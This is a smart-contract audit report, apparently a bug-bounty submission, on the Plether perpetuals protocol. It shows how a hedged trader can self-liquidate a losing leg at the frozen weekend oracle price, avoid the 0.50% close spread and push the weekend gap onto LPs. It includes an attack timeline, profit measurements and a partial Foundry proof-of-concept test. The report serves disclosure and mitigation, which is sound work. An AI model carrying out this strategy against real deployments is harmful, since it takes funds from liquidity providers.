# \#98976 [SC-Medium] Liquidation at the frozen weekend mark is not charged the 0.50% frozen-close spread, so a hedged trader drops its losing leg at Friday's price for 0.075% and LPs pay the weekend gap

**Submitted on Nov 11th 2026 at 09:09:42 UTC by @abarbatei for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98976
- **Report Type:** Smart Contract
- **Report severity:** Medium
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

From Friday 17:00 to Sunday 17:00 New York time the oracle is frozen and every price path replays the last Friday mark. The protocol protects LPs against traders who act on that stale mark in three ways: opens are blocked, LP exits pay a 0.25% / 0.75% surcharge, and a voluntary close pays a fixed 0.50% spread to LPs on top of the 0.04% execution fee.

A liquidation executed in the same window, at the same stale mark, pays none of this. It costs the 0.10% liquidation charge taken from the account's own liquidation reserve, half of which is credited back when the owner liquidates itself, plus a 0.025% price shift. The rest of the pledge is returned to the owner.

The owner decides when its position becomes liquidatable. Accrued carry counts against the pledge every second and `CfdEngine.addMargin` raises the pledge at will, so a position kept a few USDG above the 3% frozen-market requirement crosses it as soon as its owner stops topping it up.

The attack:
1. Before the Friday close, one actor holds a LONG and a SHORT of equal size in two accounts, each just above the 3% requirement.
2. On Sunday, once the weekend gap is known from markets that trade through the weekend, the actor stops topping up the leg that will lose. Carry takes it below the requirement and the actor's own keeper account liquidates it at Friday's mark.
3. After the reopen the actor closes the winning leg at the new price. LPs pay the winner's gap profit and never collect the loser's matching loss.

With release parameters, a 10M USDG pool and 1,000,000 USDG of notional per leg, the proof measures:
- leaving the losing leg at Friday's mark costs 751 USDG through liquidation and 5,902 USDG through a voluntary close;
- after a 30 bps weekend gap the attacker ends +496 USDG and LPs end -1,697 USDG. Holding the same pair through the reopen gives the attacker -2,659 USDG and LPs +1,056 USDG, and the documented stale exit (voluntary close) gives -4,654 USDG and +3,053 USDG;
- after a 100 bps gap the attacker ends +7,496 USDG and LPs end -8,700 USDG, which is 4,751 USDG worse for LPs than the same exit with the spread paid;
- with 4,000,000 USDG of notional per leg (40% of pool depth) and a 100 bps gap, the attacker ends +29,346 USDG and LPs end -34,164 USDG, 0.34% of the pool in one weekend.

## Vulnerability Details

### Intended behaviour

While `oracleFrozen` is true, order execution and liquidation replay the stored engine mark ([`PletherOracle.sol#L729-L743`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L729-L743)). The real market has moved on, so anyone who can change exposure at that mark holds a free option against LPs. The protocol closes or prices each such path:

- **Opens and increases are blocked.** The open policy is close-only whenever the oracle is frozen or the FAD window is active ([`OracleFreshnessPolicyLib.sol#L59-L63`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/OracleFreshnessPolicyLib.sol#L59-L63)). The whitepaper regime table lists "Risk increase: Blocked" for the frozen regime ([`WHITEPAPER.md#L1107-L1113`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md?plain=1#L1107-L1113)).
- **Voluntary closes pay a fixed spread to LPs.** "frozen-market stale-price protection is a fixed notional spread" ([`SECURITY.md#L1442`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md?plain=1#L1442)), 0.50% at release, charged in [`CloseAccountingLib.sol#L120-L124`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol#L120-L124).
- **LP exits pay a surcharge.** Redemptions funded while frozen pay 25 bps (Senior) or 75 bps (Junior) ([`SECURITY.md#L829-L833`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md?plain=1#L829-L833)).
- **Positions must hold 3% equity** (`fadMarginBps`) from 30 minutes before the close until 15 minutes after the reopen. The whitepaper introduces this FAD window as the answer to "scheduled FX-market closure risk" ([`WHITEPAPER.md#L1115-L1119`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md?plain=1#L1115-L1119)).

The spread is the price of leaving at a stale mark. The whitepaper's data on weekend moves gives the scale: the median Friday-to-Monday move of the basket is 24.6 bps and the 95th percentile is 90.3 bps ([`WHITEPAPER.md#L1407-L1411`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md?plain=1#L1407-L1411)). At 0.54% a stale exit pays off only on rare weekends.

### Root cause

**1. A liquidation charges no execution fee and no frozen-close spread.** The liquidation plan assesses only still-unpaid carry and the clawback of a negative lifetime VPI ([`CfdEnginePlanLib.sol#L1554-L1571`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L1554-L1571)):

```solidity
        uint256 vpiClawbackAssets = _negativeVpiReserveTarget(pos.vpiAccrued);
        delta.vpiRebateReserveBeforeAssets = snap.vpiRebateReserveAssets;
        delta.vpiRebateReserveAfterAssets = 0;
        delta.actionChargeAssessedAssets = delta.pendingCarryAssets - delta.realizedCarryAssets + vpiClawbackAssets;
```

   The voluntary close of the same position at the same mark is charged both ([`CloseAccountingLib.sol#L120-L124`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol#L120-L124)):

```solidity
        uint256 notionalAssets = (inputs.sizeDelta * inputs.oraclePrice) / CfdMath.ASSETS_TO_TOKEN_SCALE;
        state.executionFeeAssets = (notionalAssets * inputs.executionFeeBps) / 10_000;
        if (inputs.oracleFrozen) {
            state.frozenSpreadAssets = (notionalAssets * inputs.frozenCloseSpreadBps) / 10_000;
        }
```

**2. The liquidation charge is 0.10% of notional, comes from the account's own reserve, and half returns to a self-liquidator.** The charge is `bountyBps` of notional, capped by the liquidation reserve the account funded at open, and split by `keeperShareBps` ([`LiquidationAccountingLib.sol#L62-L78`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/LiquidationAccountingLib.sol#L62-L78)). `OrderRouter.executeLiquidation` is permissionless and passes `msg.sender` as the keeper ([`OrderLiquidationBatchLogic.sol#L706-L730`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L706-L730)), and the keeper share is a plain clearinghouse credit ([`MarginClearinghouse.sol#L1264-L1270`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/MarginClearinghouse.sol#L1264-L1270)). At release values (`bountyBps` 10, `keeperShareBps` 5,000, protocol share 0) LPs receive 5 bps and the owner's keeper account gets the other 5 bps back.

**3. The whole pledge is unlocked and only the price loss at the stale mark is taken.** The clearinghouse debits the price loss and the charge, then releases everything else ([`MarginClearinghouse.sol#L1244-L1256`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/MarginClearinghouse.sol#L1244-L1256), [`#L1279-L1285`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/MarginClearinghouse.sol#L1279-L1285)). The 3% equity that was meant to absorb the weekend gap goes back to the owner at Friday's price.

**4. The frozen liquidation price is Friday's mark moved 2.5 bps against the position.** While frozen the oracle uses the stored mark with a fixed confidence of `basketMaxConfidenceRatioBps` (10 bps), and liquidation shifts the price by `adverseConfidenceMultiplierBps` (25%) of it ([`PletherOracle.sol#L729-L743`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L729-L743), [`#L943-L972`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L943-L972)). No Pyth data or fee is needed.

**5. The owner controls when its position becomes liquidatable.** A position is liquidatable when `pledge + claim + price PnL <= 3% of notional` at the liquidation price ([`CfdEnginePlanLib.sol#L1450-L1469`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L1450-L1469), [`PositionRiskAccountingLib.sol#L129-L145`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/PositionRiskAccountingLib.sol#L129-L145)). The mark does not move while frozen, so only two things change that inequality:
   - carry, which is collected from the pledge first and keeps accruing while the oracle is frozen ([`CfdEngine.sol#L1407-L1449`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L1407-L1449), [`MarginClearinghouseAccountingLib.sol#L95-L107`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/MarginClearinghouseAccountingLib.sol#L95-L107));
   - `CfdEngine.addMargin`, which the owner can call at any time, in any regime, for any amount ([`CfdEngine.sol#L501-L529`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L501-L529)).

   A leg held 1.20 USDG above the threshold with an hourly top-up is safe for as long as the owner keeps topping it up, and becomes liquidatable about two hours after the owner stops (0.54 USDG of carry per hour in the proof). The choice is made on Sunday, after the gap is known.

**6. For a hedged owner, dropping one leg is a risk increase at the stale mark.** The pair has no net exposure. Removing the losing leg at Friday's price leaves a net position in the winning direction, entered at Friday's price with Sunday's knowledge. This is the trade that the close-only rule forbids and the spread is meant to price. Through liquidation it costs 7.5 bps.

### Attack walk-through (the proof's timeline)

| Time (New York) | Step | Entry point |
| :-- | :-- | :-- |
| Fri 15:00 | Open LONG and SHORT, 1,000,000 USDG notional each, about 3% margin, in two accounts | `OrderRouter.commitOrder`, executed by a third-party keeper |
| Fri 16:45 | Basket drifts up 4 bps. Top up the LONG leg to 1.20 USDG above its frozen liquidation threshold | `CfdEngine.addMargin` |
| Fri 17:00 | Oracle freezes at 1.0004. Neither leg is liquidatable (asserted) | |
| Fri 18:00 to Sun 14:00 | Hourly top-up of the LONG leg. A third-party liquidation attempt fails every hour (asserted) | `CfdEngine.addMargin` |
| Sun 14:00 | Gap known: the basket will reopen higher, so the LONG leg loses. Stop topping it up | |
| Sun 16:15 | Carry has taken the LONG pledge below the requirement. The attacker's keeper account liquidates it at 1.0004 with empty Pyth data | `OrderRouter.executeLiquidation` |
| Sun 17:00 | Oracle live. Close the SHORT leg at the new price | `OrderRouter.updateMarkPrice`, `commitOrder` |

### Limits, stated plainly

- **Only a leg that sits at the requirement can be dropped this way.** Equity can be added but not removed. A leg that gained during the last half hour before the close (the FAD window is live from 16:30 to 17:00) enters the weekend with excess equity that only carry can erode: about 0.26 bps of notional per weekend at the proof's 10% utilization and at most 2.7 bps at full utilization. In the proof the basket drifts 4 bps against the LONG leg before the close, so the LONG leg is the one at the requirement and the attack needs the gap to continue in that direction. If the gap goes the other way the owner holds the pair (control A) or pays the spread (control B); the attempt costs nothing extra. If the last half hour is flat, both legs sit at the requirement and either can be dropped.
- **The pair has a fixed cost.** Opening and closing two legs costs 2,659 USDG per 1,000,000 USDG of leg notional in the proof (fees, VPI, carry), so the pair is profitable for gaps above about 25 bps. A trader who holds a leveraged position over the weekend for other reasons pays no extra cost and gains the same cheap exit.
- **A third-party keeper may liquidate the losing leg first.** The LP outcome is identical; the owner loses the 500 USDG keeper share.
- **The Pyth mock reports zero confidence.** Live fills would be shifted against the trader by 25% of basket confidence, at most 2.5 bps per fill.

### Why this is not a documented limitation

- The Known Limitations describe the spread as the protection for stale-mark exits and limit it to voluntary closes: "oracle-frozen voluntary close/reduce execution applies normal signed VPI plus a fixed LP-owned notional spread" and "a fixed spread deliberately does not increase with mark staleness" ([`SECURITY.md#L1333-L1334`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md?plain=1#L1333-L1334)). They accept that a stale exit costs 0.50% however stale the mark is. They do not say that the same exit is available for 0.075%.
- The VPI limitations say that "liquidation does not compute a fresh VPI delta" ([`SECURITY.md#L1436`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md?plain=1#L1436)). That concerns VPI, not the spread or the fee.
- The design text states the mechanism: "liquidation pricing and settlement retain adverse-confidence pricing and do not assess the spread. This is a deliberate trade-off: preserve close and liquidation liveness during real closures" ([`SECURITY.md#L843-L845`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md?plain=1#L843-L845)). The stated purpose is liveness: an unsafe position must always be removable. Nothing in it contemplates a solvent owner choosing liquidation, after the gap is known, as a cheaper way out than the close the spread applies to. Charging the spread from the equity that a frozen-window liquidation hands back would not affect liveness at all.

## Impact Details

Selected impact: **Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield (Critical)**. LP cash in HousePool pays the winning leg's gap profit, while the matching loss on the other leg, which LPs would have collected at the reopen, is extinguished at Friday's price for a 0.075% charge. The fallback is "Theft of unclaimed yield" (High) if triage treats the avoided 0.50% spread as LP revenue rather than principal.

Measured in the proof at release parameters (pool 10,002,025 USDG; 1,000,000 USDG notional per leg; the three runs start from one EVM snapshot taken on Sunday 14:00 New York time):

| Weekend gap | Run | Attacker P&L | LP pool delta | Cost of leaving the losing leg at Friday's mark |
| --: | :-- | --: | --: | --: |
| 30 bps | Attack: liquidation at the frozen mark | +496 | -1,697 | 751 |
| 30 bps | Control A: hold both legs | -2,659 | +1,056 | n/a |
| 30 bps | Control B: voluntary frozen close | -4,654 | +3,053 | 5,902 |
| 100 bps | Attack: liquidation at the frozen mark | +7,496 | -8,700 | 751 |
| 100 bps | Control A: hold both legs | -2,672 | +1,063 | n/a |
| 100 bps | Control B: voluntary frozen close | +2,345 | -3,949 | 5,902 |

All amounts are USDG. The exit cost excludes the leg's 400 USDG price loss at Friday's mark, which is owed on any exit.

- **What LPs lose.** Whenever the cheap exit is used, LPs lose the gap on the dropped leg's notional minus 7.5 bps. Against the documented stale exit they lose a further 47.5 bps of that notional on every use (4,751 USDG per 1,000,000 USDG in the 100 bps run). For gaps between about 25 and 77 bps, which the 0.50% spread makes unprofitable, they lose principal they would otherwise have kept: -1,697 USDG instead of +1,056 USDG in the 30 bps run.
- **How often.** The whitepaper puts the median Friday-to-Monday move of the basket at 24.6 bps and the 95th percentile at 90.3 bps. The gap direction and size are observable before the reopen: USD-stablecoin pairs against the euro and other basket currencies trade on centralized exchanges through the weekend, and the news that causes a gap is public.
- **Scale.** The loss grows with leg notional. The proof's second test builds each leg from four alternating 1,000,000 USDG slices, so the book never leans more than one slice and the 40% skew cap does not bind. With 4,000,000 USDG per leg (40% of pool depth) and a 100 bps gap it measures: attack +29,346 USDG for the attacker and -34,164 USDG for LPs (0.34% of the pool); holding the pair -17,457 USDG and +11,022 USDG; the voluntary frozen close +2,752 USDG and -9,171 USDG.
- **Repeatable** every weekend and on every governance-configured holiday freeze. No trusted role is involved.
- **Capital and risk.** About 3% of leg notional per leg, released when the legs are closed. The pair has no price exposure until the losing leg is dropped.

## Mitigation

Charge the frozen-close spread on a liquidation executed while `oracleFrozen`, taken from the pledge that the liquidation would otherwise release to the account and credited to LPs, capped by that residual. A position with no residual equity is still liquidated exactly as today, so liveness is unchanged, and a solvent owner no longer has a cheaper stale exit than the voluntary close.

Two alternatives:
- during `oracleFrozen`, keep the released pledge of a liquidated account locked until the first live mark and settle the position's price PnL at that mark;
- during `oracleFrozen`, raise the liquidation charge to at least `frozenCloseSpreadBps + executionFeeBps` and route the increase to LPs.

## References

- [`CfdEnginePlanLib.sol#L1554-L1571`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L1554-L1571): liquidation assesses only unpaid carry and the negative-VPI clawback.
- [`CfdEnginePlanLib.sol#L1450-L1469`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L1450-L1469): liquidation eligibility at the FAD requirement.
- [`CloseAccountingLib.sol#L120-L124`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol#L120-L124): execution fee and frozen-close spread on a voluntary close.
- [`LiquidationAccountingLib.sol#L62-L78`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/LiquidationAccountingLib.sol#L62-L78): liquidation charge and its keeper / LP split.
- [`MarginClearinghouse.sol#L1216-L1286`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/MarginClearinghouse.sol#L1216-L1286): liquidation settlement, keeper credit and release of the remaining pledge and reserve.
- [`OrderLiquidationBatchLogic.sol#L706-L730`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L706-L730): permissionless liquidation, caller is the keeper.
- [`PletherOracle.sol#L729-L743`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L729-L743) and [`#L943-L972`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L943-L972): frozen basket and liquidation price shift.
- [`CfdEngine.sol#L501-L529`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L501-L529) and [`#L1407-L1449`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L1407-L1449): `addMargin` and carry collection from the pledge.
- [`OracleFreshnessPolicyLib.sol#L59-L63`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/OracleFreshnessPolicyLib.sol#L59-L63): opens are close-only while frozen.
- [`SECURITY.md#L829-L845`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md?plain=1#L829-L845), [`#L1333-L1334`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md?plain=1#L1333-L1334), [`#L1442`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md?plain=1#L1442): frozen-window policy and the spread as stale-price protection.
- [`WHITEPAPER.md#L1107-L1113`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md?plain=1#L1107-L1113) and [`#L1407-L1411`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md?plain=1#L1407-L1411): regime table and weekend move statistics.
- Release parameters: [`DEPLOYMENT.md#L125-L152`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/DEPLOYMENT.md?plain=1#L125-L152).
- Pinned commit [a82d4fefb02768e5b3bddcc97dee371eee24fea8](https://github.com/immunefi-team/audit-comp-plether/commit/a82d4fefb02768e5b3bddcc97dee371eee24fea8).


## Proof of Concept

## Proof of Concept

Setup. The proof is a Foundry test in the repository's own perps test suite at the pinned commit [a82d4fefb02768e5b3bddcc97dee371eee24fea8](https://github.com/immunefi-team/audit-comp-plether/commit/a82d4fefb02768e5b3bddcc97dee371eee24fea8).
- It extends `HousePoolAsyncTestBase` (which extends `BasePerpTest`) with the release risk parameters. The two release values that differ from the code defaults, the 2,500 bps adverse-confidence multiplier and the 1,000 USDG opening minimum, are installed through the owner's timelocked router configuration.
- Every attacker step goes through a public entrypoint: `OrderRouter.commitOrder` / `executeOrder` / `executeLiquidation` / `updateMarkPrice` and `CfdEngine.addMargin`. During the attack `vm.prank` only selects the sender. Orders are executed by a separate keeper address; the liquidation is sent by the attacker's own keeper account.
- Before the attack, suite helpers fund the pool (9M USDG third-party Junior deposit on top of the fixture's 1M) and the two trader accounts, and drive the out-of-scope Pyth mock, which reports zero confidence. Only USDG and Pyth are mocked, and no in-scope contract is modified.
- The weekend is 15 to 17 March 2024 (New York on daylight time). The test asserts `isFadWindow()` and `isOracleFrozen()` at each stage.
- The three runs (attack, control A, control B) start from one EVM snapshot taken on Sunday with both legs open.
- `test_LiquidationAtFrozenMarkSkipsTheFrozenCloseSpread` uses 1,000,000 USDG per leg and a 30 bps and a 100 bps gap. `test_SameExitAtFortyPercentOfPoolDepthPerLeg` uses 4,000,000 USDG per leg and a 100 bps gap.

Place the file at `packages/perps/test/poc/hunt-z-extract/ProofFrozenMarkLiquidationExit.t.sol` and run from `packages/perps`:

```
FOUNDRY_TEST=test/poc/hunt-z-extract forge test --match-path 'test/poc/hunt-z-extract/ProofFrozenMarkLiquidationExit.t.sol' -vv
```

`FOUNDRY_TEST` limits the via-IR compile to the sources plus the proof directory. On a machine that can compile the whole test tree, the plain `forge test --match-path ...` works too.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {HousePoolAsyncTestBase} from "../../perps/shared/HousePoolTestBase.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";

/**
 * Proof: while the oracle is frozen for the weekend, a position owner can leave at the stale Friday mark through
 * liquidation instead of a voluntary close. The voluntary close pays the LP-owned 0.50% frozen-close spread plus
 * the 0.04% execution fee; the liquidation pays neither. It costs the 0.10% liquidation charge taken from the
 * account's own reserve (half of it credited back when the owner is the keeper) and a 0.025% price shift, and
 * returns the rest of the pledge.
 *
 * The owner decides when its position becomes liquidatable: carry lowers the pledge every second and
 * CfdEngine.addMargin raises it at will, so a leg kept a few USDG above the 3% frozen-market requirement crosses it
 * as soon as the owner stops topping it up. The owner of a hedged pair therefore waits for the weekend gap to be
 * known, lets the losing leg be liquidated at Friday's mark, and closes the winning leg after the reopen.
 * LPs pay the winner's gap profit in full and collect about 7.5 bps from the loser.
 *
 * Every attacker step uses a public entrypoint: OrderRouter.commitOrder / executeOrder / executeLiquidation /
 * updateMarkPrice and CfdEngine.addMargin. vm.prank only selects the sender. Suite helpers fund the pool and the
 * traders before the attack and drive the out-of-scope Pyth mock. Release parameters from DEPLOYMENT.md.
 *
 * Three runs start from one EVM snapshot taken on Sunday, with both legs open since Friday:
 *   attack     the losing leg is liquidated at the frozen mark, the winner is closed after the reopen;
 *   control A  both legs are held through the reopen and closed at the new price;
 *   control B  the losing leg is closed voluntarily at the frozen mark (pays the 0.50% spread).
 */
contract ProofFrozenMarkLiquidationExit is HousePoolAsyncTestBase {

    address internal legLong = makeAddr("attackerLongAccount");
    address internal legShort = makeAddr("attackerShortAccount");
    address internal attackerKeeper = makeAddr("attackerKeeperAccount");
    address internal keeper = makeAddr("thirdPartyKeeper");
    address internal lp = makeAddr("lp");

    uint256 internal constant OPEN_PRICE = 1e8; // 1.00
    uint256 internal constant FREEZE_PRICE = 100_040_000; // 1.0004: the basket rises 4 bps in the last half hour
    uint256 internal constant SLICE_SIZE = 1_000_000e18; // 10,000 lots = 1,000,000 USDG notional at 1.00
    uint256 internal constant SLICE_LOTS = 10_000;
    uint256 internal constant KEEP_ALIVE_BUFFER = 1_200_000; // 1.20 USDG above the liquidation threshold

    /// @dev Each leg is built from `slices` orders of 1,000,000 USDG notional, LONG and SHORT alternating.
    uint256 internal slices = 1;

    // Friday 2024-03-15 and Sunday 2024-03-17; New York is on daylight time, so 17:00 New York = 21:00 UTC.
    uint256 internal constant FRI_OPEN = 1_710_529_200; // Fri 19:00 UTC, live market
    uint256 internal constant FRI_FAD = 1_710_534_600; // Fri 20:30 UTC, FAD (close-only, 3% margin) starts
    uint256 internal constant FRI_FREEZE = 1_710_536_400; // Fri 21:00 UTC, oracle frozen
    uint256 internal constant SUN_DECISION = 1_710_698_400; // Sun 18:00 UTC, gap known off-chain
    uint256 internal constant SUN_REOPEN = 1_710_709_200; // Sun 21:00 UTC, oracle live again

    struct Outcome {
        int256 attackerPnl; // both trading accounts plus the attacker's keeper account
        int256 lpDelta; // HousePool.totalAssets(); no position or claim is left at the end
        uint256 treasuryFees;
        uint256 loserExitCost; // what leaving the losing leg cost its owner, on top of its loss at Friday's mark
        uint256 liquidatedSecondsBeforeReopen;
    }

    uint256 internal attackerStart;
    uint256 internal poolStart;
    uint256 internal treasuryStart;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function setUp() public override {
        super.setUp();
        // Release router/oracle values that differ from the code defaults (DEPLOYMENT.md): 2,500 bps adverse
        // confidence multiplier and 1,000 USDG opening minimum. Owner timelocked propose/finalize.
        IOrderRouterAdminHost.RouterConfig memory config = _routerConfig();
        config.adverseConfidenceMultiplierBps = 2500;
        config.minOpenNotionalAssets = 1_000e6;
        _setRouterConfig(config);
        vm.deal(keeper, 10 ether);
        vm.deal(attackerKeeper, 10 ether);
    }

    // ------------------------------------------------------------------
    // Public-entrypoint helpers
    // ------------------------------------------------------------------

    function _request(
        CfdTypes.Side side,
        uint256 sizeDelta,
        uint256 marginDelta,
        bool isClose
    ) internal view returns (OrderV3Types.OrderRequest memory request) {
        uint256 window = router.maxExecutionWindowSeconds();
        uint256 now_ = vm.getBlockTimestamp();
        uint256 target;
        if (isClose) {
            target = side == CfdTypes.Side.LONG ? engine.CAP_PRICE() : 1;
        } else {
            target = side == CfdTypes.Side.LONG ? 1 : engine.CAP_PRICE();
        }
        request = OrderV3Types.OrderRequest({
            clientOrderId: keccak256(abi.encode(side, sizeDelta, marginDelta, isClose, now_, vm.getBlockNumber())),
            side: side,
            sizeDelta: sizeDelta,
            marginDelta: marginDelta,
            targetPrice: target,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(now_) + uint64(window),
                executionWindowSeconds: uint32(window),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
    }

    /// @dev Live market: the account commits, an unrelated keeper executes with Pyth data at `price`.
    function _commitAndExecute(
        address account,
        OrderV3Types.OrderRequest memory request,
        uint256 price
    ) internal {
        vm.prank(account);
        uint64 orderId = router.commitOrder(request);
        bytes[] memory pythData = _mockPythUpdateData(price);
        uint256 fee = router.pletherOracle().getOrderExecutionFee(pythData);
        vm.prank(keeper);
        OrderV3Types.ExecutionResult memory result = router.executeOrder{value: fee}(orderId, pythData);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "order must execute");
    }

    /// @dev Frozen market: execution replays the stored Friday mark, so no Pyth data and no fee are needed.
    function _commitAndExecuteFrozen(
        address account,
        OrderV3Types.OrderRequest memory request
    ) internal {
        vm.prank(account);
        uint64 orderId = router.commitOrder(request);
        bytes[] memory empty = new bytes[](0);
        vm.prank(keeper);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, empty);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "frozen close must execute");
    }

    function _refreshMark(
        uint256 price
    ) internal {
        bytes[] memory pythData = _mockPythUpdateData(price);
        uint256 fee = router.pletherOracle().getUpdateFee(pythData);
        vm.prank(keeper);
        router.updateMarkPrice{value: fee}(pythData);
    }

    /// @dev Permissionless liquidation at the frozen mark (empty Pyth data replays the stored mark).
    function _tryFrozenLiquidation(
        address account,
        address liquidator
    ) internal returns (bool ok) {
        bytes[] memory empty = new bytes[](0);
        vm.prank(liquidator);
        try router.executeLiquidation(account, empty) {
            ok = true;
        } catch {
            ok = false;
        }
    }

    function _lots() internal view returns (uint256) {
        return SLICE_LOTS * slices;
    }

